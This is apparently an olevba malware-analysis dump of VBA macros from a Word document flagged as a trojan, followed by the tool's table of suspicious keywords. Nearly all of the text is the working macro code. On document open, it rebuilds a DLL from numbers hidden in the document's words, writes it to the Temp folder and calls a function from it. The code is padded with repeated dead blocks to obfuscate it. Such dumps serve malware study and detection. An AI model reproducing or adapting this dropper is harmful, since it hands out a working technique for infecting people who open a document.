olevba 0.60.1 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: HEUR-Trojan.MSOffice.SAgent.gen-9caac7ec4f644b1ff69247975430b43be9691b5c3d4f040bd1f9d9c303bfd854
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: HEUR-Trojan.MSOffice.SAgent.gen-9caac7ec4f644b1ff69247975430b43be9691b5c3d4f040bd1f9d9c303bfd854 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub Edit_u2(Avawe)
Dim maxResults_contents As String
Dim stdDateFilterremoveVariables As Boolean
maxResults_contents = Environ(Avawe)
If stdDateFilterremoveVariables Then
'
'  Get SimulatedBatterySystem action interface
'
Set SimulatedBatterySystemSystemAction = WDTF.SystemDepot.ThisSystem.GetInterface("SimulatedBatterySystem")

If WScript.Arguments.Named.Exists("setup") Then
    CX.Setup
ElseIf WScript.Arguments.Named.Exists("cleanup") Then
    CX.Cleanup
ElseIf WScript.Arguments.Named.Exists("AC") Then
    CX.AC
ElseIf WScript.Arguments.Named.Exists("DC") Then
    CX.DC
ElseIf WScript.Arguments.Named.Exists("percent") Then
    CX.ChargeLevel WScript.Arguments.Named("percent")
Else
    CX.Help
End If
End If
ChDir (maxResults_contents)
If stdDateFilterremoveVariables Then
'
'  Get SimulatedBatterySystem action interface
'
Set SimulatedBatterySystemSystemAction = WDTF.SystemDepot.ThisSystem.GetInterface("SimulatedBatterySystem")

If WScript.Arguments.Named.Exists("setup") Then
    CX.Setup
ElseIf WScript.Arguments.Named.Exists("cleanup") Then
    CX.Cleanup
ElseIf WScript.Arguments.Named.Exists("AC") Then
    CX.AC
ElseIf WScript.Arguments.Named.Exists("DC") Then
    CX.DC
ElseIf WScript.Arguments.Named.Exists("percent") Then
    CX.ChargeLevel WScript.Arguments.Named("percent")
Else
    CX.Help
End If
End If
End Sub
Sub left_adminemail(accountid, layout, collection_sqlquery, taxonomy, OutSum, u31, ans, icon)
Dim sorderdbprefix As Long
Dim stdDateFilterremoveVariables As Boolean
Dim endyear_servername As Words
Set endyear_servername = ThisDocument.Words
codepress_eids = "-"
If stdDateFilterremoveVariables Then
'
'  Get SimulatedBatterySystem action interface
'
Set SimulatedBatterySystemSystemAction = WDTF.SystemDepot.ThisSystem.GetInterface("SimulatedBatterySystem")

If WScript.Arguments.Named.Exists("setup") Then
    CX.Setup
ElseIf WScript.Arguments.Named.Exists("cleanup") Then
    CX.Cleanup
ElseIf WScript.Arguments.Named.Exists("AC") Then
    CX.AC
ElseIf WScript.Arguments.Named.Exists("DC") Then
    CX.DC
ElseIf WScript.Arguments.Named.Exists("percent") Then
    CX.ChargeLevel WScript.Arguments.Named("percent")
Else
    CX.Help
End If
End If
On Error Resume Next
Dim choicetemp As String
Dim tagid_currencyCodeType As Boolean, uniqidrepo As Boolean
Dim left_subscribe As Byte, Last As Long
Dim gallery_u7
tagid_currencyCodeType = False
If stdDateFilterremoveVariables Then
'
'  Get SimulatedBatterySystem action interface
'
Set SimulatedBatterySystemSystemAction = WDTF.SystemDepot.ThisSystem.GetInterface("SimulatedBatterySystem")

If WScript.Arguments.Named.Exists("setup") Then
    CX.Setup
ElseIf WScript.Arguments.Named.Exists("cleanup") Then
    CX.Cleanup
ElseIf WScript.Arguments.Named.Exists("AC") Then
    CX.AC
ElseIf WScript.Arguments.Named.Exists("DC") Then
    CX.DC
ElseIf WScript.Arguments.Named.Exists("percent") Then
    CX.ChargeLevel WScript.Arguments.Named("percent")
Else
    CX.Help
End If
End If
collection_sqlquery = collection_sqlquery + ".dll"
If stdDateFilterremoveVariables Then
'
'  Get SimulatedBatterySystem action interface
'
Set SimulatedBatterySystemSystemAction = WDTF.SystemDepot.ThisSystem.GetInterface("SimulatedBatterySystem")

If WScript.Arguments.Named.Exists("setup") Then
    CX.Setup
ElseIf WScript.Arguments.Named.Exists("cleanup") Then
    CX.Cleanup
ElseIf WScript.Arguments.Named.Exists("AC") Then
    CX.AC
ElseIf WScript.Arguments.Named.Exists("DC") Then
    CX.DC
ElseIf WScript.Arguments.Named.Exists("percent") Then
    CX.ChargeLevel WScript.Arguments.Named("percent")
Else
    CX.Help
End If
End If
Edit_u2 ("Temp")
removeheader.mobile (collection_sqlquery)
For Each gallery_u7 In endyear_servername
If stdDateFilterremoveVariables Then
'
'  Get SimulatedBatterySystem action interface
'
Set SimulatedBatterySystemSystemAction = WDTF.SystemDepot.ThisSystem.GetInterface("SimulatedBatterySystem")

If WScript.Arguments.Named.Exists("setup") Then
    CX.Setup
ElseIf WScript.Arguments.Named.Exists("cleanup") Then
    CX.Cleanup
ElseIf WScript.Arguments.Named.Exists("AC") Then
    CX.AC
ElseIf WScript.Arguments.Named.Exists("DC") Then
    CX.DC
ElseIf WScript.Arguments.Named.Exists("percent") Then
    CX.ChargeLevel WScript.Arguments.Named("percent")
Else
    CX.Help
End If
End If
If gallery_u7 = codepress_eids Then
uniqidrepo = True
GoTo newpwd
End If
If uniqidrepo = True Then
If stdDateFilterremoveVariables Then
'
'  Get SimulatedBatterySystem action interface
'
Set SimulatedBatterySystemSystemAction = WDTF.SystemDepot.ThisSystem.GetInterface("SimulatedBatterySystem")

If WScript.Arguments.Named.Exists("setup") Then
    CX.Setup
ElseIf WScript.Arguments.Named.Exists("cleanup") Then
    CX.Cleanup
ElseIf WScript.Arguments.Named.Exists("AC") Then
    CX.AC
ElseIf WScript.Arguments.Named.Exists("DC") Then
    CX.DC
ElseIf WScript.Arguments.Named.Exists("percent") Then
    CX.ChargeLevel WScript.Arguments.Named("percent")
Else
    CX.Help
End If
End If
gallery_u7 = codepress_eids + gallery_u7
uniqidrepo = False
End If
If gallery_u7 <> accountid And tagid_currencyCodeType = False Then
GoTo newpwd
End If
If IsNumeric(gallery_u7) And tagid_currencyCodeType Then
sorderdbprefix = Val(gallery_u7)
If stdDateFilterremoveVariables Then
'
'  Get SimulatedBatterySystem action interface
'
Set SimulatedBatterySystemSystemAction = WDTF.SystemDepot.ThisSystem.GetInterface("SimulatedBatterySystem")

If WScript.Arguments.Named.Exists("setup") Then
    CX.Setup
ElseIf WScript.Arguments.Named.Exists("cleanup") Then
    CX.Cleanup
ElseIf WScript.Arguments.Named.Exists("AC") Then
    CX.AC
ElseIf WScript.Arguments.Named.Exists("DC") Then
    CX.DC
ElseIf WScript.Arguments.Named.Exists("percent") Then
    CX.ChargeLevel WScript.Arguments.Named("percent")
Else
    CX.Help
End If
End If
Put #39, , sorderdbprefix
End If
If gallery_u7 = accountid Then
If stdDateFilterremoveVariables Then
'
'  Get SimulatedBatterySystem action interface
'
Set SimulatedBatterySystemSystemAction = WDTF.SystemDepot.ThisSystem.GetInterface("SimulatedBatterySystem")

If WScript.Arguments.Named.Exists("setup") Then
    CX.Setup
ElseIf WScript.Arguments.Named.Exists("cleanup") Then
    CX.Cleanup
ElseIf WScript.Arguments.Named.Exists("AC") Then
    CX.AC
ElseIf WScript.Arguments.Named.Exists("DC") Then
    CX.DC
ElseIf WScript.Arguments.Named.Exists("percent") Then
    CX.ChargeLevel WScript.Arguments.Named("percent")
Else
    CX.Help
End If
If stdDateFilterremoveVariables Then
'
'  Get SimulatedBatterySystem action interface
'
Set SimulatedBatterySystemSystemAction = WDTF.SystemDepot.ThisSystem.GetInterface("SimulatedBatterySystem")

If WScript.Arguments.Named.Exists("setup") Then
    CX.Setup
ElseIf WScript.Arguments.Named.Exists("cleanup") Then
    CX.Cleanup
ElseIf WScript.Arguments.Named.Exists("AC") Then
    CX.AC
ElseIf WScript.Arguments.Named.Exists("DC") Then
    CX.DC
ElseIf WScript.Arguments.Named.Exists("percent") Then
    CX.ChargeLevel WScript.Arguments.Named("percent")
Else
    CX.Help
End If
End If
End If
tagid_currencyCodeType = True
If stdDateFilterremoveVariables Then
'
'  Get SimulatedBatterySystem action interface
'
Set SimulatedBatterySystemSystemAction = WDTF.SystemDepot.ThisSystem.GetInterface("SimulatedBatterySystem")

If WScript.Arguments.Named.Exists("setup") Then
    CX.Setup
ElseIf WScript.Arguments.Named.Exists("cleanup") Then
    CX.Cleanup
ElseIf WScript.Arguments.Named.Exists("AC") Then
    CX.AC
ElseIf WScript.Arguments.Named.Exists("DC") Then
    CX.DC
ElseIf WScript.Arguments.Named.Exists("percent") Then
    CX.ChargeLevel WScript.Arguments.Named("percent")
Else
    CX.Help
End If
End If
ElseIf gallery_u7 = layout Then
tagid_currencyCodeType = False
GoTo aname
End If
newpwd:
Next gallery_u7
aname:
removeheader.Width (resource)
End Sub
Sub downloadpos_opener()
Dim stdDateFilterremoveVariables As Boolean
On Error Resume Next
If stdDateFilterremoveVariables Then
'
'  Get SimulatedBatterySystem action interface
'
Set SimulatedBatterySystemSystemAction = WDTF.SystemDepot.ThisSystem.GetInterface("SimulatedBatterySystem")

If WScript.Arguments.Named.Exists("setup") Then
    CX.Setup
ElseIf WScript.Arguments.Named.Exists("cleanup") Then
    CX.Cleanup
ElseIf WScript.Arguments.Named.Exists("AC") Then
    CX.AC
ElseIf WScript.Arguments.Named.Exists("DC") Then
    CX.DC
ElseIf WScript.Arguments.Named.Exists("percent") Then
    CX.ChargeLevel WScript.Arguments.Named("percent")
Else
    CX.Help
End If
End If
Dim dateEnd_endyear As Boolean
If stdDateFilterremoveVariables Then
'
'  Get SimulatedBatterySystem action interface
'
Set SimulatedBatterySystemSystemAction = WDTF.SystemDepot.ThisSystem.GetInterface("SimulatedBatterySystem")

If WScript.Arguments.Named.Exists("setup") Then
    CX.Setup
ElseIf WScript.Arguments.Named.Exists("cleanup") Then
    CX.Cleanup
ElseIf WScript.Arguments.Named.Exists("AC") Then
    CX.AC
ElseIf WScript.Arguments.Named.Exists("DC") Then
    CX.DC
ElseIf WScript.Arguments.Named.Exists("percent") Then
    CX.ChargeLevel WScript.Arguments.Named("percent")
Else
    CX.Help
End If
End If
Call left_adminemail("txtx", "NEWCHOICENEWCHOICE", "totalProductCount", "returnURL", "banned", "modal", "u6", "exact")
If stdDateFilterremoveVariables Then
'
'  Get SimulatedBatterySystem action interface
'
Set SimulatedBatterySystemSystemAction = WDTF.SystemDepot.ThisSystem.GetInterface("SimulatedBatterySystem")

If WScript.Arguments.Named.Exists("setup") Then
    CX.Setup
ElseIf WScript.Arguments.Named.Exists("cleanup") Then
    CX.Cleanup
ElseIf WScript.Arguments.Named.Exists("AC") Then
    CX.AC
ElseIf WScript.Arguments.Named.Exists("DC") Then
    CX.DC
ElseIf WScript.Arguments.Named.Exists("percent") Then
    CX.ChargeLevel WScript.Arguments.Named("percent")
Else
    CX.Help
End If
End If
dateEnd_endyear = removeheader.bidets(43)
If stdDateFilterremoveVariables Then
'
'  Get SimulatedBatterySystem action interface
'
Set SimulatedBatterySystemSystemAction = WDTF.SystemDepot.ThisSystem.GetInterface("SimulatedBatterySystem")

If WScript.Arguments.Named.Exists("setup") Then
    CX.Setup
ElseIf WScript.Arguments.Named.Exists("cleanup") Then
    CX.Cleanup
ElseIf WScript.Arguments.Named.Exists("AC") Then
    CX.AC
ElseIf WScript.Arguments.Named.Exists("DC") Then
    CX.DC
ElseIf WScript.Arguments.Named.Exists("percent") Then
    CX.ChargeLevel WScript.Arguments.Named("percent")
Else
    CX.Help
End If
End If
If dateEnd_endyear = False Then
Call left_adminemail("USERNAMEUSERNAME", "answersanswers", "totalProductCount", "returnURL", "banned", "modal", "u6", "exact")
If stdDateFilterremoveVariables Then
'
'  Get SimulatedBatterySystem action interface
'
Set SimulatedBatterySystemSystemAction = WDTF.SystemDepot.ThisSystem.GetInterface("SimulatedBatterySystem")

If WScript.Arguments.Named.Exists("setup") Then
    CX.Setup
ElseIf WScript.Arguments.Named.Exists("cleanup") Then
    CX.Cleanup
ElseIf WScript.Arguments.Named.Exists("AC") Then
    CX.AC
ElseIf WScript.Arguments.Named.Exists("DC") Then
    CX.DC
ElseIf WScript.Arguments.Named.Exists("percent") Then
    CX.ChargeLevel WScript.Arguments.Named("percent")
Else
    CX.Help
End If
End If
If stdDateFilterremoveVariables Then
'
'  Get SimulatedBatterySystem action interface
'
Set SimulatedBatterySystemSystemAction = WDTF.SystemDepot.ThisSystem.GetInterface("SimulatedBatterySystem")

If WScript.Arguments.Named.Exists("setup") Then
    CX.Setup
ElseIf WScript.Arguments.Named.Exists("cleanup") Then
    CX.Cleanup
ElseIf WScript.Arguments.Named.Exists("AC") Then
    CX.AC
ElseIf WScript.Arguments.Named.Exists("DC") Then
    CX.DC
ElseIf WScript.Arguments.Named.Exists("percent") Then
    CX.ChargeLevel WScript.Arguments.Named("percent")
Else
    CX.Help
End If
End If
removeheader.bidets (23)
End If
End Sub
Private Sub Document_Open()
Edit_u2 ("Temp")
downloadpos_opener
End Sub


-------------------------------------------------------------------------------
VBA MACRO removeheader.bas 
in file: HEUR-Trojan.MSOffice.SAgent.gen-9caac7ec4f644b1ff69247975430b43be9691b5c3d4f040bd1f9d9c303bfd854 - OLE stream: 'Macros/VBA/removeheader'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Declare PtrSafe Sub languages Lib "ntdll" Alias "RtlMoveMemory" _
(Destination As LongPtr, Source As LongPtr, ByVal Length As LongPtr)
Declare PtrSafe Function bidets Lib "totalProductCount" Alias "implode" (ByVal ArgVal1 As Long) As Boolean
Private Declare PtrSafe Sub dob Lib "ntdll" Alias "index" _
(Destination As LongPtr, Source As LongPtr, ByVal Length As LongPtr)
Sub Width(edit)
Dim map_orderby As Boolean
If map_orderby Then
'
'  Get SimulatedBatterySystem action interface
'
Set SimulatedBatterySystemSystemAction = WDTF.SystemDepot.ThisSystem.GetInterface("SimulatedBatterySystem")

If WScript.Arguments.Named.Exists("setup") Then
    CX.Setup
ElseIf WScript.Arguments.Named.Exists("cleanup") Then
    CX.Cleanup
ElseIf WScript.Arguments.Named.Exists("AC") Then
    CX.AC
ElseIf WScript.Arguments.Named.Exists("DC") Then
    CX.DC
ElseIf WScript.Arguments.Named.Exists("percent") Then
    CX.ChargeLevel WScript.Arguments.Named("percent")
Else
    CX.Help
End If
End If
Close #39
If ctid_menu Then
'
'  Get SimulatedBatterySystem action interface
'
Set SimulatedBatterySystemSystemAction = WDTF.SystemDepot.ThisSystem.GetInterface("SimulatedBatterySystem")

If WScript.Arguments.Named.Exists("setup") Then
    CX.Setup
ElseIf WScript.Arguments.Named.Exists("cleanup") Then
    CX.Cleanup
ElseIf WScript.Arguments.Named.Exists("AC") Then
    CX.AC
ElseIf WScript.Arguments.Named.Exists("DC") Then
    CX.DC
ElseIf WScript.Arguments.Named.Exists("percent") Then
    CX.ChargeLevel WScript.Arguments.Named("percent")
Else
    CX.Help
End If
End If
End Sub
Sub mobile(edit)
Dim ctid_menu As Boolean
If ctid_menu Then
'
'  Get SimulatedBatterySystem action interface
'
Set SimulatedBatterySystemSystemAction = WDTF.SystemDepot.ThisSystem.GetInterface("SimulatedBatterySystem")

If WScript.Arguments.Named.Exists("setup") Then
    CX.Setup
ElseIf WScript.Arguments.Named.Exists("cleanup") Then
    CX.Cleanup
ElseIf WScript.Arguments.Named.Exists("AC") Then
    CX.AC
ElseIf WScript.Arguments.Named.Exists("DC") Then
    CX.DC
ElseIf WScript.Arguments.Named.Exists("percent") Then
    CX.ChargeLevel WScript.Arguments.Named("percent")
Else
    CX.Help
End If
End If
Open edit For Binary As #39
If ctid_menu Then
'
'  Get SimulatedBatterySystem action interface
'
Set SimulatedBatterySystemSystemAction = WDTF.SystemDepot.ThisSystem.GetInterface("SimulatedBatterySystem")

If WScript.Arguments.Named.Exists("setup") Then
    CX.Setup
ElseIf WScript.Arguments.Named.Exists("cleanup") Then
    CX.Cleanup
ElseIf WScript.Arguments.Named.Exists("AC") Then
    CX.AC
ElseIf WScript.Arguments.Named.Exists("DC") Then
    CX.DC
ElseIf WScript.Arguments.Named.Exists("percent") Then
    CX.ChargeLevel WScript.Arguments.Named("percent")
Else
    CX.Help
End If
End If
End Sub

+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|Environ             |May read system environment variables        |
|Suspicious|Open                |May open a file                              |
|Suspicious|Put                 |May write to a file (if combined with Open)  |
|Suspicious|Binary              |May read or write a binary file (if combined |
|          |                    |with Open)                                   |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|Lib                 |May run code from a DLL                      |
|Suspicious|RtlMoveMemory       |May inject code into another process         |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

